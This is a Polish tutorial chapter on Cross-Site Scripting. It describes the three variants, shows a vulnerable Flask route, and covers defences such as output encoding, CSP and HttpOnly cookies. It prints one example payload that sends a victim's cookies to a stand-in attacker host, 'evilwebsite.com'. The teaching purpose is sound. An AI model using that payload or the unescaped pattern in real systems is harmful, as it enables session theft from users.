# Cross-Site Scripting (XSS)
## Wstęp teoretyczny

W poprzednim temacie poznaliśmy zasady działania oraz metody zapobiegania atakom SQL Injection.
W tym rozdziale opisany zostanie inny atak z kategorii *wstrzyknięcia kodu* ---
**Cross-Site Scripting (XSS)**.

**Cross-Site Scripting** to atak polegający na wstrzyknięciu złośliwego kodu skryptowego wykorzystującego *inline script*
(najczęściej JavaScript) do stron internetowych, przez co *osadzając złośliwą treść w stronach*, które następnie są 
*wyświetlane innym użytkownikom*. W odróżnieniu od SQL Injection, gdzie celem ataku jest serwer i baza danych, 
w XSS celem jest *przeglądarka ofiary* - atakujący dąży do wykonania złośliwego kodu przez użytkownika, gdy ten wchodzi na zaufaną stronę z osadzonym, złośliwym kodem.
W ten sposób, atakujący są w stanie obejść niektóre mechanizmy kontroli dostępu do danych.

Wyróżniamy trzy główne odmiany ataku XSS:

- **Reflected XSS (nietrwały)** - złośliwy skrypt jest zawarty bezpośrednio w żądaniu HTTP
          (np. w parametrze URL) i natychmiast zwracany przez serwer w odpowiedzi bez zapisania.
          Ofiara musi kliknąć spreparowany link;
- **Stored XSS (trwały)** - złośliwy skrypt zostaje *zapisany w bazie danych* serwera
          (np. jako komentarz, post na forum) i jest serwowany każdemu użytkownikowi odwiedzającemu daną stronę;
- **DOM-based XSS** - złośliwy kod nie przechodzi przez serwer; jest wykonywany wyłącznie
          po stronie klienta przez manipulację modelem DOM strony (Document Object Model).


W przypadku stron napisanych w HTML, najczęstszym elementem wykorzystywanym w celu ataku XSS jest *\<script\>* - element pozwalający wywołać kod w języku JavaScript na komputerze osoby,
która wchodzi w daną stronę. *\<script\>* może być połączone z wieloma funkcjami, które pozwalają na nieporządane efekty, w tym:

- *fetch* - wysyłanie żądań HTTP;
- *eval* - wykonanie i ewaluacja dowolnego skryptu JavaScript;
- *atob* - ASCII-to-Base64, funkcja pozwalająca na ukrycie złośliwego kodu poprzez zakodowanie go w systemie base64.


Rozważmy prosty przykład aplikacji webowej w języku Python (Flask), podatnej na atak XSS, która wyświetla powitalny komunikat
z nazwą użytkownika pobraną z parametru URL:

```
@app.route('/welcome')
def welcome():
    username = request.args.get('user', '')
    return "<h1>Witaj, " + username + "!</h1>"
```

Dla normalnego wywołania */welcome?user=user1* aplikacja zwróci bezpieczny napis witający użytkownika:

```
<h1>Witaj, user1!</h1>
```

Natomiast - atakujący może przygotować złośliwy kod, który zostanie wywołany przez przeglądarkę internetową ofiary:
```
/welcome?user=<script>document.location='https://evilwebsite.com/steal?c='
+document.cookie</script>
```

Wówczas przeglądarka ofiary wykona osadzony skrypt JavaScript, który wykradnie pliki cookie sesji i wyśle je na serwer atakującego. 
Dzięki temu atakujący może, na potrzeby przykładu, *przejąć sesję* zalogowanego użytkownika bez znajomości jego hasła.

Częstymi skutkami udanego ataku XSS są:

- kradzież plików cookie sesji i przejęcie konta;
- przechwycenie danych wpisywanych przez użytkownika (keylogging);
- przekierowanie użytkownika na fałszywe strony w celu wyłudzenia jego danych (phishing);
- wykonanie nieautoryzowanych działań w imieniu ofiary (np. przelewów bankowych).


## Zabezpieczenia
Zabezpieczenia przed wektorem *Cross-Site Scripting* obejmują:
1. **Kodowanie wyjścia** (Output Encoding) - podejście w którym każda wartość dynamicznie wstawiana do HTML
            jest zakodowana tak, aby znaki specjalne języka - *<, >, ", ', &* -
            były traktowane jako *tekst*, nie jako *kod*. Biblioteki takie jak *markupsafe* w Pythonie
            lub *html.escape()* realizują to automatycznie;

2. **Walidacja i sanityzacja danych wejściowych** - analogicznie do SQL Injection, efektywną ochroną przed atakami XSS jest stosowanie białej listy
            dopuszczalnych znaków/słów i odrzucanie danych zawierających znaki specjalne inne, niż podane w liście;

3. **Content Security Policy (CSP)** - nagłówek HTTP ograniczający źródła, z których przeglądarka może ładować i wykonywać skrypty. 
            Poprawna konfiguracja CSP uniemożliwia wykonanie inline scripts nawet, jeśli zostaną wstrzyknięte:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
4. **Flagi bezpieczeństwa plików cookie** - istnieją flagi plików cookie, których użycie minimalizuje skutki kradzieży ciasteczek. W to wchodzą 
        m.in. *HttpOnly* - cookie niedostępny dla JavaScript, oraz *Secure* - cookie przesyłany tylko przez HTTPS;


Poniżej znajduje się przykład bezpiecznego fragmentu kodu przykładowego (Python, Flask), wykorzystującego podejście kodowania wyjścia: 

```
import html

@app.route('/welcome')
def welcome():
    username = html.escape(request.args.get('user', ''))
    return "<h1>Witaj, " + username + "!</h1>"
```

Wykorzystując funkcję *html.escape* w pythonie, kodujemy wszystkie znaki specjalne w podanym przez użytkownika wejściu jako ich odpowiedniki tekstowe. Dzięki temu 
jesteśmy w stanie wyświetlić je w kodzie bez problemu, nie umożliwiając na osadzenie złośliwego kodu. 

## Dodatkowa literatura 
1. [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
2. [https://owasp.org/www-community/Types_of_Cross-Site_Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
3. [https://pl.wikipedia.org/wiki/Cross-site_scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
4. [https://sekurak.pl/czym-jest-xss/](https://sekurak.pl/czym-jest-xss/)